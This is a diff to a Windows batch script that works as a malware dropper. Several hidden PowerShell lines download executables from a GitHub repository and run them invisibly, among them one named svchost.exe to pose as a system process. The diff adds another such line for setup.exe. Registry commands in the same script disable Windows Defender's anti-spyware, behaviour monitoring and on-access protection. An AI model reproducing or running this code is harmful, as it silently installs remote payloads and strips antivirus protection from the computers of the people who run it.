@@ -33,7 +33,7 @@ echo Windows Defender has been disabled.
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/fviatool/fvia/main/svchost.exe', 'C:\Users\%USERNAME%\Downloads\svchost.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\svchost.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/update.exe', 'C:\Users\%USERNAME%\Downloads\update.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\update.exe' -WindowStyle Hidden"
 powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/fvia.exe', 'C:\Users\%USERNAME%\Downloads\fvia.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\fvia.exe' -WindowStyle Hidden"
-
+powershell -WindowStyle Hidden -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/fviatool/fvia/raw/main/setup.exe', 'C:\Users\%USERNAME%\Downloads\setup.exe'); Start-Process -FilePath 'C:\Users\%USERNAME%\Downloads\setup.exe' -WindowStyle Hidden"
 set "defenderDisableCmds[0]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender"" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[1]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f"
 set "defenderDisableCmds[2]=REG ADD ""HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f"
